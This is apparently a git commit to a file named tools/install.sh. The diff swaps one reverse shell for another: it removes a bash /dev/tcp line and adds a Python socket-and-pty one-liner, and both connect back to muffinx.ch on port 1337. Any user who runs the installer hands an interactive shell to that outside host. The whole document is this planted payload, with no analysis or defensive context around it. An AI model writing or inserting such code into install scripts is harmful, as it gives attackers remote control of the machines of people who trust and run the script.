c29f122cdfffc5a4c0e82bac491e6cbba003a400
muffinx <muffinx@muffinhouse>
2022-09-24 20:38:35 +0200

    go3

--- tools/install.sh
+++ tools/install.sh
@@ -1,4 +1,4 @@
 #!/bin/sh
 
 echo hax
-sh -i >& /dev/tcp/muffinx.ch/1337 0>&1
+python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("muffinx.ch",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
